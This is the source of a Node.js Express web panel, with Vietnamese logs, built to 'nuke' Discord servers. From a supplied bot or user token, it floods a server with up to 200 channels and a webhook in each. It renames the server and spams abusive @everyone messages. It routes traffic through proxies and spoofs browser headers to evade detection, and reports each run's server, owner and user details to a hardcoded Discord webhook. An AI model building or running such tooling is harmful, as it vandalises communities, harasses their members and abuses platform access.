import express from 'express';
import { ProxyAgent } from 'undici';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

async function fire(token, isBot, method, path, body, dispatcher) {
  return fetch(`https://discord.com/api/v9${path}`, {
    method,
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
      'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0=',
      'Accept-Language': 'en-US,en;q=0.9',
      Authorization: isBot ? `Bot ${token}` : token,
    },
    body: body ? JSON.stringify(body) : undefined,
    dispatcher: dispatcher ?? undefined,
  });
}

async function notifyNuke(info) {
  const { guildName, guildIcon, guildId, ownerId, mode, channels, webhooks, msgs, user, error } = info;
  const embed = {
    title: error ? 'Nuke thất bại' : 'Nuke thành công',
    color: error ? 0xff0000 : 0x00ff66,
    fields: [
      { name: 'Server', value: guildName || 'không rõ', inline: true },
      { name: 'Guild ID', value: guildId || '-', inline: true },
      { name: 'Mode', value: mode, inline: true },
      { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
      { name: 'Webhook', value: String(webhooks ?? 0), inline: true },
      { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
      { name: 'Người dùng', value: user || '-', inline: true },
      { name: 'Owner ID', value: ownerId || '-', inline: true },
      { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
    ],
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'nuke panel | by PhTuanKhanh' },
    timestamp: new Date().toISOString(),
  };
  if (guildId) embed.fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
  if (error) embed.fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
  const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };
  try {
    await fetch(NOTIFY_WEBHOOK + '?wait=false', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {}
}

app.post('/api/nuke', async (req, res) => {
  const {
    token, isBot, guildId, proxy,
    channelCount = 100,
    channelName = 'NUKE BY PHTUANKHANH',
    renameName = 'NUKE BY PTK',
    webhookMsgCount = 1,
    pingEveryone = true,
  } = req.body ?? {};

  if (!token || !guildId) return res.status(400).json({ error: 'token + guildId required' });

  const cc = Math.max(1, Math.min(200, parseInt(channelCount, 10) || 100));
  const mc = Math.max(0, Math.min(20, parseInt(webhookMsgCount, 10) || 1));

  res.setHeader('Content-Type', 'application/x-ndjson');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('X-Accel-Buffering', 'no');
  const send = obj => res.write(JSON.stringify(obj) + '\n');
  const log = s => { console.log(s); send({ log: s }); };

  const proxyUrl = (proxy && String(proxy).trim()) || process.env.PROXY || null;
  let dispatcher = null;
  if (proxyUrl) {
    try { dispatcher = new ProxyAgent({ uri: proxyUrl, connect: { timeout: 10000 } }); }
    catch (e) { log(`proxy invalid: ${e.message}`); }
  }
  if (dispatcher) log(`dùng proxy: ${proxyUrl.split('@').pop()}`);

  let guild = null, me = null;
  let channelsCreated = 0, webhooksCreated = 0, msgsSent = 0;

  try {
    const t0 = Date.now();
    log(`start | mode=${isBot ? 'bot' : 'user'} | guild=${guildId}`);

    me = await (await fire(token, isBot, 'GET', '/users/@me', null, dispatcher)).json();
    log(`auth ok | ${me.username}`);

    guild = await (await fire(token, isBot, 'GET', `/guilds/${guildId}`, null, dispatcher)).json();
    log(`guild ok | ${guild.name}`);

    log(`bắn ${cc} kênh song song...`);
    const tCh = Date.now();
    const chanResults = await Promise.allSettled(
      Array.from({ length: cc }, (_, i) =>
        fire(token, isBot, 'POST', `/guilds/${guildId}/channels`, {
          name: `${channelName}-${i}`, type: 0,
        }, dispatcher)
      )
    );
    const channelIds = [];
    for (const r of chanResults) {
      if (r.status === 'fulfilled') {
        try {
          const j = await r.value.json();
          if (j.id) { channelIds.push(j.id); channelsCreated++; }
        } catch {}
      }
    }
    log(`kênh gửi ${cc} | tạo được ${channelIds.length} trong ${Date.now() - tCh}ms`);

    log(`bắn ${channelIds.length} webhook song song...`);
    const tWh = Date.now();
    const whResults = await Promise.allSettled(
      channelIds.map(cid =>
        fire(token, isBot, 'POST', `/channels/${cid}/webhooks`, { name: 'nuke' }, dispatcher)
      )
    );
    const webhooks = [];
    for (const r of whResults) {
      if (r.status === 'fulfilled') {
        try {
          const j = await r.value.json();
          if (j.id && j.token) { webhooks.push({ id: j.id, token: j.token }); webhooksCreated++; }
        } catch {}
      }
    }
    log(`webhook gửi ${channelIds.length} | tạo được ${webhooks.length} trong ${Date.now() - tWh}ms`);

    if (renameName) {
      try {
        await fire(token, isBot, 'PATCH', `/guilds/${guildId}`, { name: renameName }, dispatcher);
        log(`renamed -> ${renameName}`);
      } catch (e) { log(`rename fail: ${e.message}`); }
    }

    if (webhooks.length && mc > 0) {
      const total = webhooks.length * mc;
      log(`spam: ${webhooks.length} wh x ${mc} = ${total} msgs`);
      const tSp = Date.now();
      const msgs = [
        `# NUKED\n> ${pingEveryone ? '@everyone' : ''} cút hết`,
        `# raz3d\n> ${pingEveryone ? '@everyone' : ''} server chết`,
        `# get fucked\n> ${pingEveryone ? '@everyone' : ''}`,
        `# void\n> ${pingEveryone ? '@everyone' : ''} nuke`,
      ];
      const pick = a => a[Math.floor(Math.random() * a.length)];
      const jobs = [];
      for (const w of webhooks) for (let i = 0; i < mc; i++) jobs.push(w);
      const results = await Promise.allSettled(
        jobs.map(w => {
          const body = { content: pick(msgs), username: 'nuke' };
          if (pingEveryone) body.allowed_mentions = { parse: ['everyone'] };
          return fetch(`https://discord.com/api/v9/webhooks/${w.id}/${w.token}?wait=false`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
            },
            body: JSON.stringify(body),
            dispatcher: dispatcher ?? undefined,
          });
        })
      );
      for (const r of results) if (r.status === 'fulfilled' && r.value.ok) msgsSent++;
      log(`spam ${msgsSent}/${total} trong ${Date.now() - tSp}ms`);
    }

    log(`DONE | tổng ${Date.now() - t0}ms`);

    await notifyNuke({
      guildName: guild?.name,
      guildIcon: guild?.icon ? `https://cdn.discordapp.com/icons/${guildId}/${guild.icon}.png?size=256` : null,
      guildId, ownerId: guild?.owner_id,
      mode: isBot ? 'bot' : 'user',
      channels: channelsCreated, webhooks: webhooksCreated, msgs: msgsSent,
      user: me?.username ?? null,
      error: null,
    });
  } catch (e) {
    log(`FATAL ${e.message}`);
    await notifyNuke({
      guildName: guild?.name, guildIcon: null, guildId, ownerId: guild?.owner_id,
      mode: isBot ? 'bot' : 'user',
      channels: channelsCreated, webhooks: webhooksCreated, msgs: msgsSent,
      user: me?.username ?? null, error: e.message,
    });
  } finally {
    res.end();
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
